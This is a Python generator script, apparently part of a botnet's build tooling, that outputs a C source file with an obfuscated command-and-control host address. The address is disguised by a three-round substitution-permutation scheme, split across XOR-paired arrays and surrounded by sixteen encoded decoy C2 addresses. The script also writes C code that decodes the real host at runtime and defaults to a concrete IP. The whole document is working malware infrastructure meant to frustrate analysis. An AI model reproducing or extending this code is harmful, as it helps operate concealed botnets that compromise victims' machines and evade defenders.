#!/usr/bin/env python3
"""Generate bot/core/c2host.c with 3-round SPN-obfuscated C2 host address."""

import sys, random

# ── Deterministic S-boxes (same as encode_all.py) ────────────────
def generate_sbox(seed):
    rng = random.Random(seed)
    values = list(range(256))
    rng.shuffle(values)
    sbox = bytes(values)
    inv = bytearray(256)
    for i, v in enumerate(values):
        inv[v] = i
    return sbox, bytes(inv)

SBOX, SBOX_INV = generate_sbox(0xC1A24B8E_DEADBEEF)
SBOX2, SBOX2_INV = generate_sbox(0x7F3E9D5C_2B1A4806)

C2_SEED = 0xC2A1B8E3

def lcg(s):
    return (s * 1103515245 + 12345) & 0xFFFFFFFF

def lcg2(s):
    return (s * 0x41C64E6D + 0x3039) & 0xFFFFFFFF

def lcg3(s):
    return (s * 0x6B8B4567 + 0x6D092B1D) & 0xFFFFFFFF

def rol8(b, n):
    n &= 7
    return ((b << n) | (b >> (8 - n))) & 0xFF

def ror8(b, n):
    return rol8(b, (8 - n) & 7)

def encode(host):
    encoded = bytearray()

    # Embed seed: 4 bytes with multi-layer protection
    for i in range(4):
        seed_byte = (C2_SEED >> (i * 8)) & 0xFF
        b = ror8(seed_byte, (i + 1) & 7)
        b ^= (i * 0x37 + 0x1D) & 0xFF
        b ^= 0xA5
        b = (~b) & 0xFF
        encoded.append(b)

    state = C2_SEED
    state2 = C2_SEED ^ 0xDEADBEEF
    state3 = C2_SEED ^ 0xCAFEBABE

    for i, ch in enumerate(host):
        state = lcg(state)
        state2 = lcg2(state2)
        state3 = lcg3(state3)

        k1 = ((state >> 16) ^ (state2 >> 8) ^ (i * 0x1D)) & 0xFF
        k2 = ((state2 >> 8) ^ (state3 >> 16) ^ (i * 0x3B)) & 0xFF
        k3 = ((state >> 24) ^ (state3 >> 8) ^ (i * i + 0x7F)) & 0xFF

        b = ord(ch)

        # Round 1: NOT → XOR k1 → S-box → rotate
        b = (~b) & 0xFF
        b ^= k1
        b = SBOX[b]
        b = rol8(b, (i + 1) & 7)

        # Round 2: XOR k2 → S-box2 → rotate
        b ^= k2
        b = SBOX2[b]
        b = rol8(b, (i + 3) & 7)

        # Round 3: XOR k3 → S-box → rotate
        b ^= k3
        b = SBOX[b]
        b = rol8(b, (i + 5) & 7)

        encoded.append(b)

    return bytes(encoded)

def decode(encoded):
    seed_bytes = encoded[:4]
    seed = 0
    for i in range(4):
        b = seed_bytes[i]
        b = (~b) & 0xFF
        b ^= 0xA5
        b ^= (i * 0x37 + 0x1D) & 0xFF
        b = rol8(b, (i + 1) & 7)
        seed |= b << (i * 8)

    state = seed
    state2 = seed ^ 0xDEADBEEF
    state3 = seed ^ 0xCAFEBABE
    decoded = []

    for i in range(4, len(encoded)):
        state = lcg(state)
        state2 = lcg2(state2)
        state3 = lcg3(state3)

        k1 = ((state >> 16) ^ (state2 >> 8) ^ ((i - 4) * 0x1D)) & 0xFF
        k2 = ((state2 >> 8) ^ (state3 >> 16) ^ ((i - 4) * 0x3B)) & 0xFF
        k3 = ((state >> 24) ^ (state3 >> 8) ^ ((i - 4) * (i - 4) + 0x7F)) & 0xFF

        b = encoded[i]

        # Reverse 3 rounds
        b = ror8(b, ((i - 4) + 5) & 7)
        b = SBOX_INV[b]
        b ^= k3

        b = ror8(b, ((i - 4) + 3) & 7)
        b = SBOX2_INV[b]
        b ^= k2

        b = ror8(b, ((i - 4) + 1) & 7)
        b = SBOX_INV[b]
        b ^= k1
        b = (~b) & 0xFF

        decoded.append(chr(b))

    return ''.join(decoded)

def split_arrays(data):
    """Armada-style: split data into 4 XOR-paired arrays. data = _rx0 ^ _rx1 ^ _rx2 ^ _rx3"""
    n = len(data)
    rx = [bytearray(n) for _ in range(4)]
    for i in range(n):
        rx[0][i] = random.randint(0, 255)
        rx[1][i] = random.randint(0, 255)
        rx[2][i] = random.randint(0, 255)
        rx[3][i] = data[i] ^ rx[0][i] ^ rx[1][i] ^ rx[2][i]
    return [bytes(r) for r in rx]

def generate_c_source(host, encoded):
    split = split_arrays(encoded)
    # Decoy C2 addresses — embedded in binary but never used
    decoy_hosts = [
        "185.232.64.12", "94.102.61.27", "45.155.205.233", "103.214.172.19",
        "77.73.134.56", "212.80.217.39", "91.240.118.172", "5.206.224.74",
        "cnc-master.ddns.net", "panel.admin-c2.com", "update.sys-svc.net",
        "reports.ntp-sync.org", "cdn-metrics.cloud", "api.telemetry-svc.com",
        "chudnet-control.duckdns.org", "backup.cnc-mirror.xyz",
    ]
    decoy_encoded = []
    for d in decoy_hosts:
        decoy_encoded.append(encode(d))

    lines = []
    lines.append('#include "c2host.h"')
    lines.append('#include <string.h>')
    lines.append('#include <arpa/inet.h>')
    lines.append('')

    # Split XOR arrays (Armada technique: key never stored in one piece)
    for idx, arr in enumerate(split):
        lines.append(f'static unsigned char c2_split_{idx}[] = {{')
        for i in range(0, len(arr), 16):
            lines.append('    ' + ', '.join(f'0x{b:02x}' for b in arr[i:i+16]) + ',')
        lines.append('};')
        lines.append('')

    # S-box tables
    lines.append('static const unsigned char c2_sbox_inv[256] = {')
    for i in range(0, 256, 16):
        lines.append('    ' + ', '.join(f'0x{b:02X}' for b in SBOX_INV[i:i+16]) + ',')
    lines.append('};')
    lines.append('')
    lines.append('static const unsigned char c2_sbox2_inv[256] = {')
    for i in range(0, 256, 16):
        lines.append('    ' + ', '.join(f'0x{b:02X}' for b in SBOX2_INV[i:i+16]) + ',')
    lines.append('};')
    lines.append('')

    lines.append(f'    /* Split-XOR embedded C2 host: "{host}" ({len(host)} bytes) */')
    lines.append('')

    # Decoy C2 hosts — embedded noise
    lines.append('/* Decoy relay pool — unused by runtime */')
    for di, dec in enumerate(decoy_encoded):
        lines.append(f'static unsigned char c2_decoy_{di}[] = {{')
        lines.append(f'    {", ".join(f"0x{b:02x}" for b in dec)}')
        lines.append('};')
        lines.append(f'static int c2_decoy_{di}_len = {len(dec)};')
    lines.append('static void *c2_decoys[] = {')
    lines.append('    ' + ', '.join(f'(void*)c2_decoy_{i}' for i in range(len(decoy_encoded))) + ',')
    lines.append('    NULL')
    lines.append('};')
    lines.append(f'static int c2_num_decoys = {len(decoy_encoded)};')
    lines.append(f'/* Encoded C2 host: "{host}" ({len(host)} bytes) */')
    lines.append('')
    lines.append('static char c2_decoded[64] = {{0}};')
    lines.append('static int c2_ready = 0;')
    lines.append('')

    lines.append('static unsigned int c2_lcg(unsigned int seed) {')
    lines.append('    return (seed * 1103515245) + 12345;')
    lines.append('}')
    lines.append('')
    lines.append('static unsigned int c2_lcg2(unsigned int seed) {')
    lines.append('    return (seed * 0x41C64E6D) + 0x3039;')
    lines.append('}')
    lines.append('')
    lines.append('static unsigned int c2_lcg3(unsigned int seed) {')
    lines.append('    return (seed * 0x6B8B4567) + 0x6D092B1D;')
    lines.append('}')
    lines.append('')
    lines.append('static unsigned char c2_rol8(unsigned char b, int n) {')
    lines.append('    n &= 7;')
    lines.append('    return (b << n) | (b >> (8 - n));')
    lines.append('}')
    lines.append('')
    lines.append('static unsigned char c2_ror8(unsigned char b, int n) {')
    lines.append('    n &= 7;')
    lines.append('    return (b >> n) | (b << (8 - n));')
    lines.append('}')
    lines.append('')

    lines.append('void c2_init_host(void)')
    lines.append('{')
    lines.append('    int i, idx;')
    lines.append('    unsigned int seed = 0, seed2, seed3;')
    lines.append('    unsigned char b;')
    lines.append('    unsigned char merged[256];')
    lines.append(f'    int c2_len = {len(encoded)};')
    lines.append('    if (c2_len < 5) return;')
    lines.append('')
    lines.append('    /* Armada-style XOR reassembly: c2_split_0 ^ c2_split_1 ^ c2_split_2 ^ c2_split_3 */')
    lines.append('    for (i = 0; i < c2_len; i++) {')
    lines.append('        merged[i] = c2_split_0[i] ^ c2_split_1[i] ^ c2_split_2[i] ^ c2_split_3[i];')
    lines.append('    }')
    lines.append('')
    lines.append('    for (i = 0; i < 4; i++) {')
    lines.append('        b = ~merged[i];')
    lines.append('        b ^= 0xA5;')
    lines.append('        b ^= (unsigned char)((i * 0x37) + 0x1D);')
    lines.append('        b = c2_rol8(b, (i + 1) & 7);')
    lines.append('        seed |= (unsigned int)b << (i * 8);')
    lines.append('    }')
    lines.append('')
    lines.append('    seed2 = seed ^ 0xDEADBEEF;')
    lines.append('    seed3 = seed ^ 0xCAFEBABE;')
    lines.append('    for (i = 4; i < c2_len; i++) {')
    lines.append('        idx = i - 4;')
    lines.append('        seed = c2_lcg(seed);')
    lines.append('        seed2 = c2_lcg2(seed2);')
    lines.append('        seed3 = c2_lcg3(seed3);')
    lines.append('')
    lines.append('        b = merged[i];')
    lines.append('')
    lines.append('        b = c2_ror8(b, (idx + 5) & 7);')
    lines.append('        b = c2_sbox_inv[b];')
    lines.append('        b ^= (unsigned char)(((seed >> 24) ^ (seed3 >> 8) ^ (idx * idx + 0x7F)) & 0xFF);')
    lines.append('')
    lines.append('        b = c2_ror8(b, (idx + 3) & 7);')
    lines.append('        b = c2_sbox2_inv[b];')
    lines.append('        b ^= (unsigned char)(((seed2 >> 8) ^ (seed3 >> 16) ^ (idx * 0x3B)) & 0xFF);')
    lines.append('')
    lines.append('        b = c2_ror8(b, (idx + 1) & 7);')
    lines.append('        b = c2_sbox_inv[b];')
    lines.append('        b ^= (unsigned char)(((seed >> 16) ^ (seed2 >> 8) ^ (idx * 0x1D)) & 0xFF);')
    lines.append('        c2_decoded[idx] = (char)(~b);')
    lines.append('    }')
    lines.append('    c2_decoded[c2_len - 4] = 0;')
    lines.append('    c2_ready = 1;')
    lines.append('}')
    lines.append('')
    lines.append('char *c2_get_host(void) {')
    lines.append('    if (!c2_ready) c2_init_host();')
    lines.append('    return c2_decoded;')
    lines.append('}')

    return '\n'.join(lines) + '\n'

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '51.222.128.80'
    encoded = encode(host)
    decoded = decode(encoded)
    assert decoded == host, f"Roundtrip failed: {decoded!r} != {host!r}"
    source = generate_c_source(host, encoded)
    print(f'/* Encoded C2 host: "{host}" ({len(host)} bytes) */')
    print(source)
